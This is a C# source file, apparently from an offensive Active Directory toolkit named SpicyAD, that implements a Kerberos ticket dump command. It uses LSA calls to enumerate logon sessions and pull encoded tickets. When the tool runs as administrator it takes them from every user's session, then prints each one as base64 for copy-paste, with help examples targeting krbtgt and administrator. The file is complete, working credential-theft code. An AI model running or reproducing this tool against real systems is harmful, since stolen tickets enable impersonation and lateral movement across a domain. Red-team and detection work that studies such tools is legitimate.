using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace SpicyAD
{
    public class TicketDump
    {
        #region Native Structures

        [StructLayout(LayoutKind.Sequential)]
        private struct LSA_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct LUID
        {
            public uint LowPart;
            public int HighPart;

            public override string ToString()
            {
                return $"0x{((long)HighPart << 32 | LowPart):x}";
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SECURITY_LOGON_SESSION_DATA
        {
            public uint Size;
            public LUID LogonId;
            public LSA_UNICODE_STRING UserName;
            public LSA_UNICODE_STRING LogonDomain;
            public LSA_UNICODE_STRING AuthenticationPackage;
            public uint LogonType;
            public uint Session;
            public IntPtr Sid;
            public long LogonTime;
            public LSA_UNICODE_STRING LogonServer;
            public LSA_UNICODE_STRING DnsDomainName;
            public LSA_UNICODE_STRING Upn;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct LSA_UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;

            public override string ToString()
            {
                if (Buffer == IntPtr.Zero || Length == 0)
                    return string.Empty;
                return Marshal.PtrToStringUni(Buffer, Length / 2);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_QUERY_TKT_CACHE_REQUEST
        {
            public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
            public LUID LogonId;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_QUERY_TKT_CACHE_RESPONSE
        {
            public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
            public int CountOfTickets;
            // Followed by KERB_TICKET_CACHE_INFO array
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_TICKET_CACHE_INFO
        {
            public LSA_UNICODE_STRING ServerName;
            public LSA_UNICODE_STRING RealmName;
            public long StartTime;
            public long EndTime;
            public long RenewTime;
            public int EncryptionType;
            public uint TicketFlags;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_RETRIEVE_TKT_REQUEST
        {
            public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
            public LUID LogonId;
            public LSA_UNICODE_STRING TargetName;
            public uint TicketFlags;
            public uint CacheOptions;
            public int EncryptionType;
            public SECURITY_HANDLE CredentialsHandle;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_RETRIEVE_TKT_RESPONSE
        {
            public KERB_EXTERNAL_TICKET Ticket;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_EXTERNAL_TICKET
        {
            public IntPtr ServiceName;
            public IntPtr TargetName;
            public IntPtr ClientName;
            public LSA_UNICODE_STRING DomainName;
            public LSA_UNICODE_STRING TargetDomainName;
            public LSA_UNICODE_STRING AltTargetDomainName;
            public KERB_CRYPTO_KEY SessionKey;
            public uint TicketFlags;
            public uint Flags;
            public long KeyExpirationTime;
            public long StartTime;
            public long EndTime;
            public long RenewUntil;
            public long TimeSkew;
            public int EncodedTicketSize;
            public IntPtr EncodedTicket;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_CRYPTO_KEY
        {
            public int KeyType;
            public int Length;
            public IntPtr Value;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SECURITY_HANDLE
        {
            public IntPtr LowPart;
            public IntPtr HighPart;
        }

        private enum KERB_PROTOCOL_MESSAGE_TYPE
        {
            KerbDebugRequestMessage = 0,
            KerbQueryTicketCacheMessage = 1,
            KerbChangeMachinePasswordMessage = 2,
            KerbVerifyPacMessage = 3,
            KerbRetrieveTicketMessage = 4,
            KerbUpdateAddressesMessage = 5,
            KerbPurgeTicketCacheMessage = 6,
            KerbChangePasswordMessage = 7,
            KerbRetrieveEncodedTicketMessage = 8,
            KerbDecryptDataMessage = 9,
            KerbAddBindingCacheEntryMessage = 10,
            KerbSetPasswordMessage = 11,
            KerbSetPasswordExMessage = 12,
            KerbVerifyCredentialsMessage = 13,
            KerbQueryTicketCacheExMessage = 14,
            KerbPurgeTicketCacheExMessage = 15,
            KerbRefreshSmartcardCredentialsMessage = 16,
            KerbAddExtraCredentialsMessage = 17,
            KerbQuerySupplementalCredentialsMessage = 18,
            KerbTransferCredentialsMessage = 19,
            KerbQueryTicketCacheEx2Message = 20,
            KerbSubmitTicketMessage = 21,
            KerbAddExtraCredentialsExMessage = 22,
            KerbQueryKdcProxyCacheMessage = 23,
            KerbPurgeKdcProxyCacheMessage = 24,
            KerbQueryTicketCacheEx3Message = 25,
            KerbCleanupMachinePkinitCredsMessage = 26,
            KerbAddBindingCacheEntryExMessage = 27,
            KerbQueryBindingCacheMessage = 28,
            KerbPurgeBindingCacheMessage = 29,
            KerbQueryDomainExtendedPoliciesMessage = 30,
            KerbQueryS4U2ProxyCacheMessage = 31
        }

        [Flags]
        private enum KERB_CACHE_OPTIONS : uint
        {
            KERB_RETRIEVE_TICKET_DEFAULT = 0x0,
            KERB_RETRIEVE_TICKET_DONT_USE_CACHE = 0x1,
            KERB_RETRIEVE_TICKET_USE_CACHE_ONLY = 0x2,
            KERB_RETRIEVE_TICKET_USE_CREDHANDLE = 0x4,
            KERB_RETRIEVE_TICKET_AS_KERB_CRED = 0x8,
            KERB_RETRIEVE_TICKET_WITH_SEC_CRED = 0x10,
            KERB_RETRIEVE_TICKET_CACHE_TICKET = 0x20,
            KERB_RETRIEVE_TICKET_MAX_LIFETIME = 0x40
        }

        #endregion

        #region Native Imports

        [DllImport("secur32.dll", SetLastError = true)]
        private static extern int LsaConnectUntrusted(out IntPtr LsaHandle);

        [DllImport("secur32.dll", SetLastError = true)]
        private static extern int LsaRegisterLogonProcess(
            ref LSA_STRING LogonProcessName,
            out IntPtr LsaHandle,
            out ulong SecurityMode);

        [DllImport("secur32.dll", SetLastError = true)]
        private static extern int LsaLookupAuthenticationPackage(
            IntPtr LsaHandle,
            ref LSA_STRING PackageName,
            out uint AuthenticationPackage);

        [DllImport("secur32.dll", SetLastError = true)]
        private static extern int LsaCallAuthenticationPackage(
            IntPtr LsaHandle,
            uint AuthenticationPackage,
            IntPtr ProtocolSubmitBuffer,
            int SubmitBufferLength,
            out IntPtr ProtocolReturnBuffer,
            out int ReturnBufferLength,
            out int ProtocolStatus);

        [DllImport("secur32.dll", SetLastError = true)]
        private static extern int LsaFreeReturnBuffer(IntPtr Buffer);

        [DllImport("secur32.dll", SetLastError = true)]
        private static extern int LsaDeregisterLogonProcess(IntPtr LsaHandle);

        [DllImport("secur32.dll", SetLastError = true)]
        private static extern int LsaEnumerateLogonSessions(
            out uint LogonSessionCount,
            out IntPtr LogonSessionList);

        [DllImport("secur32.dll", SetLastError = true)]
        private static extern int LsaGetLogonSessionData(
            IntPtr LogonId,
            out IntPtr ppLogonSessionData);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            uint DesiredAccess,
            out IntPtr TokenHandle);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            int TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength,
            out int ReturnLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        private const uint TOKEN_QUERY = 0x0008;

        #endregion

        #region Ticket Flags

        [Flags]
        public enum TicketFlags : uint
        {
            Reserved = 0x80000000,
            Forwardable = 0x40000000,
            Forwarded = 0x20000000,
            Proxiable = 0x10000000,
            Proxy = 0x08000000,
            MayPostdate = 0x04000000,
            Postdated = 0x02000000,
            Invalid = 0x01000000,
            Renewable = 0x00800000,
            Initial = 0x00400000,
            PreAuthent = 0x00200000,
            HwAuthent = 0x00100000,
            OkAsDelegate = 0x00040000,
            Anonymous = 0x00020000,
            NameCanonicalize = 0x00010000,
            EncPaRep = 0x00010000,
            Reserved1 = 0x00000001
        }

        #endregion

        public static void Dump(string targetLuid = null, string targetService = null, string targetUser = null)
        {
            Console.WriteLine("[*] Action: Dump Kerberos Tickets\n");

            // Check if running elevated
            bool isElevated = IsHighIntegrity();
            bool privilegedConnection = false;

            IntPtr lsaHandle = IntPtr.Zero;
            try
            {
                // Connect to LSA
                int status;
                if (isElevated)
                {
                    LSA_STRING logonProcessName = new LSA_STRING();
                    logonProcessName.Buffer = Marshal.StringToHGlobalAnsi("SpicyAD");
                    logonProcessName.Length = (ushort)"SpicyAD".Length;
                    logonProcessName.MaximumLength = (ushort)("SpicyAD".Length + 1);

                    ulong securityMode;
                    status = LsaRegisterLogonProcess(ref logonProcessName, out lsaHandle, out securityMode);
                    Marshal.FreeHGlobal(logonProcessName.Buffer);

                    if (status == 0)
                    {
                        privilegedConnection = true;
                        OutputHelper.Verbose("[+] Running with high integrity - can dump all sessions\n");
                    }
                    else
                    {
                        OutputHelper.Verbose($"[!] LsaRegisterLogonProcess failed: 0x{status:X8}");
                        OutputHelper.Verbose("[*] Falling back to untrusted connection...\n");
                        status = LsaConnectUntrusted(out lsaHandle);
                    }
                }
                else
                {
                    OutputHelper.Verbose("[*] Not running elevated - dumping current user tickets only\n");
                    status = LsaConnectUntrusted(out lsaHandle);
                }

                if (status != 0)
                {
                    Console.WriteLine($"[!] Failed to connect to LSA: 0x{status:X8}");
                    return;
                }

                // Get Kerberos authentication package ID
                LSA_STRING kerbPackageName = new LSA_STRING();
                kerbPackageName.Buffer = Marshal.StringToHGlobalAnsi("kerberos");
                kerbPackageName.Length = (ushort)"kerberos".Length;
                kerbPackageName.MaximumLength = (ushort)("kerberos".Length + 1);

                uint authPackage;
                status = LsaLookupAuthenticationPackage(lsaHandle, ref kerbPackageName, out authPackage);
                Marshal.FreeHGlobal(kerbPackageName.Buffer);

                if (status != 0)
                {
                    Console.WriteLine($"[!] LsaLookupAuthenticationPackage failed: 0x{status:X8}");
                    return;
                }

                int totalTickets = 0;

                // If not privileged, just dump current session with LUID=0
                if (!privilegedConnection)
                {
                    OutputHelper.Verbose("[*] Querying current session tickets...\n");
                    LUID zeroLuid = new LUID { LowPart = 0, HighPart = 0 };

                    List<TicketInfo> tickets = QueryTicketCache(lsaHandle, authPackage, zeroLuid, targetService);

                    if (tickets.Count > 0)
                    {
                        Console.WriteLine($"  UserName              : {Environment.UserDomainName}\\{Environment.UserName}");
                        OutputHelper.Verbose($"  LogonId               : (current session)");
                        Console.WriteLine($"  Tickets               : {tickets.Count}");
                        Console.WriteLine();

                        foreach (var ticket in tickets)
                        {
                            PrintTicket(ticket);
                            totalTickets++;
                        }
                    }
                    else
                    {
                        Console.WriteLine("[!] No tickets found in current session");
                        Console.WriteLine("[*] Try: klist    to verify you have Kerberos tickets");
                        Console.WriteLine("[*] Or access a network resource first: dir \\\\dc\\sysvol");
                    }

                    Console.WriteLine($"\n[*] Total tickets dumped: {totalTickets}");
                    return;
                }

                // Privileged mode - enumerate all sessions
                uint sessionCount;
                IntPtr sessionList;
                status = LsaEnumerateLogonSessions(out sessionCount, out sessionList);

                if (status != 0)
                {
                    Console.WriteLine($"[!] LsaEnumerateLogonSessions failed: 0x{status:X8}");
                    return;
                }

                OutputHelper.Verbose($"[*] Found {sessionCount} logon sessions\n");

                IntPtr currentLuid = sessionList;

                for (uint i = 0; i < sessionCount; i++)
                {
                    LUID luid = (LUID)Marshal.PtrToStructure(currentLuid, typeof(LUID));

                    // Filter by LUID if specified
                    if (!string.IsNullOrEmpty(targetLuid))
                    {
                        string luidStr = luid.ToString().ToLower();
                        if (!luidStr.Contains(targetLuid.ToLower().Replace("0x", "")))
                        {
                            currentLuid = IntPtr.Add(currentLuid, Marshal.SizeOf(typeof(LUID)));
                            continue;
                        }
                    }

                    // Get session data
                    IntPtr sessionDataPtr;
                    status = LsaGetLogonSessionData(currentLuid, out sessionDataPtr);

                    if (status == 0 && sessionDataPtr != IntPtr.Zero)
                    {
                        SECURITY_LOGON_SESSION_DATA sessionData =
                            (SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(sessionDataPtr, typeof(SECURITY_LOGON_SESSION_DATA));

                        string userName = sessionData.UserName.ToString();
                        string domain = sessionData.LogonDomain.ToString();

                        // Filter by user if specified
                        if (!string.IsNullOrEmpty(targetUser))
                        {
                            if (!userName.ToLower().Contains(targetUser.ToLower()))
                            {
                                LsaFreeReturnBuffer(sessionDataPtr);
                                currentLuid = IntPtr.Add(currentLuid, Marshal.SizeOf(typeof(LUID)));
                                continue;
                            }
                        }

                        // Query ticket cache for this session
                        List<TicketInfo> tickets = QueryTicketCache(lsaHandle, authPackage, luid, targetService);

                        if (tickets.Count > 0)
                        {
                            Console.WriteLine($"  UserName              : {domain}\\{userName}");
                            OutputHelper.Verbose($"  LogonId               : {luid}");
                            OutputHelper.Verbose($"  LogonType             : {GetLogonTypeName(sessionData.LogonType)}");
                            OutputHelper.Verbose($"  AuthPackage           : {sessionData.AuthenticationPackage}");
                            Console.WriteLine($"  Tickets               : {tickets.Count}");
                            Console.WriteLine();

                            foreach (var ticket in tickets)
                            {
                                PrintTicket(ticket);
                                totalTickets++;
                            }

                            Console.WriteLine(new string('-', 60));
                            Console.WriteLine();
                        }

                        LsaFreeReturnBuffer(sessionDataPtr);
                    }

                    currentLuid = IntPtr.Add(currentLuid, Marshal.SizeOf(typeof(LUID)));
                }

                LsaFreeReturnBuffer(sessionList);

                Console.WriteLine($"\n[*] Total tickets dumped: {totalTickets}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
            }
            finally
            {
                if (lsaHandle != IntPtr.Zero)
                {
                    LsaDeregisterLogonProcess(lsaHandle);
                }
            }
        }

        private class TicketInfo
        {
            public string ServerName { get; set; }
            public string RealmName { get; set; }
            public DateTime StartTime { get; set; }
            public DateTime EndTime { get; set; }
            public DateTime RenewTime { get; set; }
            public int EncryptionType { get; set; }
            public uint TicketFlags { get; set; }
            public byte[] EncodedTicket { get; set; }
            public int SessionKeyType { get; set; }
        }

        private static List<TicketInfo> QueryTicketCache(IntPtr lsaHandle, uint authPackage, LUID luid, string targetService)
        {
            List<TicketInfo> tickets = new List<TicketInfo>();

            // First, query the ticket cache to get list of tickets
            KERB_QUERY_TKT_CACHE_REQUEST cacheRequest = new KERB_QUERY_TKT_CACHE_REQUEST();
            cacheRequest.MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage;
            cacheRequest.LogonId = luid;

            IntPtr requestPtr = Marshal.AllocHGlobal(Marshal.SizeOf(cacheRequest));
            Marshal.StructureToPtr(cacheRequest, requestPtr, false);

            IntPtr responsePtr;
            int responseSize;
            int protocolStatus;

            int status = LsaCallAuthenticationPackage(
                lsaHandle,
                authPackage,
                requestPtr,
                Marshal.SizeOf(cacheRequest),
                out responsePtr,
                out responseSize,
                out protocolStatus);

            Marshal.FreeHGlobal(requestPtr);

            if (status != 0 || protocolStatus != 0)
            {
                return tickets;
            }

            if (responsePtr == IntPtr.Zero)
            {
                return tickets;
            }

            KERB_QUERY_TKT_CACHE_RESPONSE cacheResponse =
                (KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure(responsePtr, typeof(KERB_QUERY_TKT_CACHE_RESPONSE));

            int ticketInfoSize = Marshal.SizeOf(typeof(KERB_TICKET_CACHE_INFO));
            IntPtr ticketPtr = IntPtr.Add(responsePtr, Marshal.SizeOf(typeof(KERB_QUERY_TKT_CACHE_RESPONSE)));

            for (int i = 0; i < cacheResponse.CountOfTickets; i++)
            {
                KERB_TICKET_CACHE_INFO ticketCacheInfo =
                    (KERB_TICKET_CACHE_INFO)Marshal.PtrToStructure(ticketPtr, typeof(KERB_TICKET_CACHE_INFO));

                string serverName = ticketCacheInfo.ServerName.ToString();

                // Filter by service if specified
                if (!string.IsNullOrEmpty(targetService))
                {
                    if (!serverName.ToLower().Contains(targetService.ToLower()))
                    {
                        ticketPtr = IntPtr.Add(ticketPtr, ticketInfoSize);
                        continue;
                    }
                }

                // Now retrieve the actual encoded ticket
                byte[] encodedTicket = RetrieveEncodedTicket(lsaHandle, authPackage, luid, serverName, out int sessionKeyType);

                TicketInfo ticket = new TicketInfo
                {
                    ServerName = serverName,
                    RealmName = ticketCacheInfo.RealmName.ToString(),
                    StartTime = DateTime.FromFileTimeUtc(ticketCacheInfo.StartTime),
                    EndTime = DateTime.FromFileTimeUtc(ticketCacheInfo.EndTime),
                    RenewTime = DateTime.FromFileTimeUtc(ticketCacheInfo.RenewTime),
                    EncryptionType = ticketCacheInfo.EncryptionType,
                    TicketFlags = ticketCacheInfo.TicketFlags,
                    EncodedTicket = encodedTicket,
                    SessionKeyType = sessionKeyType
                };

                tickets.Add(ticket);
                ticketPtr = IntPtr.Add(ticketPtr, ticketInfoSize);
            }

            LsaFreeReturnBuffer(responsePtr);
            return tickets;
        }

        private static byte[] RetrieveEncodedTicket(IntPtr lsaHandle, uint authPackage, LUID luid, string serverName, out int sessionKeyType)
        {
            sessionKeyType = 0;

            // Build target name
            LSA_UNICODE_STRING targetName = new LSA_UNICODE_STRING();
            targetName.Length = (ushort)(serverName.Length * 2);
            targetName.MaximumLength = (ushort)((serverName.Length + 1) * 2);
            targetName.Buffer = Marshal.StringToHGlobalUni(serverName);

            int requestSize = Marshal.SizeOf(typeof(KERB_RETRIEVE_TKT_REQUEST)) + targetName.MaximumLength;
            IntPtr requestPtr = Marshal.AllocHGlobal(requestSize);

            // Zero out memory
            for (int i = 0; i < requestSize; i++)
                Marshal.WriteByte(requestPtr, i, 0);

            KERB_RETRIEVE_TKT_REQUEST request = new KERB_RETRIEVE_TKT_REQUEST();
            request.MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage;
            request.LogonId = luid;
            request.CacheOptions = (uint)(KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED | KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_USE_CACHE_ONLY);
            request.EncryptionType = 0;
            request.TicketFlags = 0;

            // Set target name - it follows the structure in memory
            IntPtr targetNameBuffer = IntPtr.Add(requestPtr, Marshal.SizeOf(typeof(KERB_RETRIEVE_TKT_REQUEST)));
            Marshal.Copy(serverName.ToCharArray(), 0, targetNameBuffer, serverName.Length);

            request.TargetName.Length = targetName.Length;
            request.TargetName.MaximumLength = targetName.MaximumLength;
            request.TargetName.Buffer = targetNameBuffer;

            Marshal.StructureToPtr(request, requestPtr, false);

            IntPtr responsePtr;
            int responseSize;
            int protocolStatus;

            int status = LsaCallAuthenticationPackage(
                lsaHandle,
                authPackage,
                requestPtr,
                requestSize,
                out responsePtr,
                out responseSize,
                out protocolStatus);

            Marshal.FreeHGlobal(targetName.Buffer);
            Marshal.FreeHGlobal(requestPtr);

            if (status != 0 || protocolStatus != 0 || responsePtr == IntPtr.Zero)
            {
                return null;
            }

            KERB_RETRIEVE_TKT_RESPONSE response =
                (KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure(responsePtr, typeof(KERB_RETRIEVE_TKT_RESPONSE));

            sessionKeyType = response.Ticket.SessionKey.KeyType;

            byte[] ticket = null;
            if (response.Ticket.EncodedTicketSize > 0 && response.Ticket.EncodedTicket != IntPtr.Zero)
            {
                ticket = new byte[response.Ticket.EncodedTicketSize];
                Marshal.Copy(response.Ticket.EncodedTicket, ticket, 0, response.Ticket.EncodedTicketSize);
            }

            LsaFreeReturnBuffer(responsePtr);
            return ticket;
        }

        private static bool _noWrap = false;

        public static void SetNoWrap(bool value)
        {
            _noWrap = value;
        }

        private static void PrintTicket(TicketInfo ticket)
        {
            Console.WriteLine($"    ServiceName         : {ticket.ServerName}");
            OutputHelper.Verbose($"    TargetName          : {ticket.RealmName}");
            OutputHelper.Verbose($"    StartTime           : {ticket.StartTime.ToLocalTime()}");
            Console.WriteLine($"    EndTime             : {ticket.EndTime.ToLocalTime()}");
            OutputHelper.Verbose($"    RenewTill           : {ticket.RenewTime.ToLocalTime()}");
            OutputHelper.Verbose($"    SessionKeyType      : {GetEncryptionTypeName(ticket.SessionKeyType)}");
            Console.WriteLine($"    TicketEncType       : {GetEncryptionTypeName(ticket.EncryptionType)}");
            OutputHelper.Verbose($"    TicketFlags         : {FormatTicketFlags(ticket.TicketFlags)}");

            if (ticket.EncodedTicket != null && ticket.EncodedTicket.Length > 0)
            {
                string base64Ticket = Convert.ToBase64String(ticket.EncodedTicket);

                if (_noWrap)
                {
                    // Single line output for easy copy-paste
                    Console.WriteLine($"    Base64(ticket)      : {base64Ticket}");
                }
                else
                {
                    Console.WriteLine($"    Base64(ticket)      :");
                    Console.WriteLine();

                    // Print in chunks for readability
                    for (int i = 0; i < base64Ticket.Length; i += 100)
                    {
                        int len = Math.Min(100, base64Ticket.Length - i);
                        Console.WriteLine($"      {base64Ticket.Substring(i, len)}");
                    }
                }
            }
            Console.WriteLine();
        }

        private static string FormatTicketFlags(uint flags)
        {
            List<string> flagNames = new List<string>();
            TicketFlags tf = (TicketFlags)flags;

            if ((tf & TicketFlags.Forwardable) != 0) flagNames.Add("forwardable");
            if ((tf & TicketFlags.Forwarded) != 0) flagNames.Add("forwarded");
            if ((tf & TicketFlags.Proxiable) != 0) flagNames.Add("proxiable");
            if ((tf & TicketFlags.Proxy) != 0) flagNames.Add("proxy");
            if ((tf & TicketFlags.MayPostdate) != 0) flagNames.Add("may_postdate");
            if ((tf & TicketFlags.Postdated) != 0) flagNames.Add("postdated");
            if ((tf & TicketFlags.Invalid) != 0) flagNames.Add("invalid");
            if ((tf & TicketFlags.Renewable) != 0) flagNames.Add("renewable");
            if ((tf & TicketFlags.Initial) != 0) flagNames.Add("initial");
            if ((tf & TicketFlags.PreAuthent) != 0) flagNames.Add("pre_authent");
            if ((tf & TicketFlags.HwAuthent) != 0) flagNames.Add("hw_authent");
            if ((tf & TicketFlags.OkAsDelegate) != 0) flagNames.Add("ok_as_delegate");
            if ((tf & TicketFlags.NameCanonicalize) != 0) flagNames.Add("name_canonicalize");

            return string.Join(", ", flagNames);
        }

        private static string GetEncryptionTypeName(int encType)
        {
            switch (encType)
            {
                case 1: return "des-cbc-crc";
                case 3: return "des-cbc-md5";
                case 17: return "aes128-cts-hmac-sha1-96";
                case 18: return "aes256-cts-hmac-sha1-96";
                case 23: return "rc4-hmac";
                case 24: return "rc4-hmac-exp";
                default: return $"unknown ({encType})";
            }
        }

        private static string GetLogonTypeName(uint logonType)
        {
            switch (logonType)
            {
                case 2: return "Interactive";
                case 3: return "Network";
                case 4: return "Batch";
                case 5: return "Service";
                case 7: return "Unlock";
                case 8: return "NetworkCleartext";
                case 9: return "NewCredentials";
                case 10: return "RemoteInteractive";
                case 11: return "CachedInteractive";
                default: return $"Unknown ({logonType})";
            }
        }

        private static bool IsHighIntegrity()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void ShowHelp()
        {
            Console.WriteLine("Usage: SpicyAD.exe dump [options]");
            Console.WriteLine();
            Console.WriteLine("Options:");
            Console.WriteLine("  /luid:<0x..>     - Filter by logon session LUID");
            Console.WriteLine("  /service:<name>  - Filter by service name (e.g., krbtgt, cifs)");
            Console.WriteLine("  /user:<name>     - Filter by username");
            Console.WriteLine();
            Console.WriteLine("Examples:");
            Console.WriteLine("  SpicyAD.exe dump");
            Console.WriteLine("  SpicyAD.exe dump /service:krbtgt");
            Console.WriteLine("  SpicyAD.exe dump /user:administrator");
            Console.WriteLine("  SpicyAD.exe dump /luid:0x3e7");
        }
    }
}
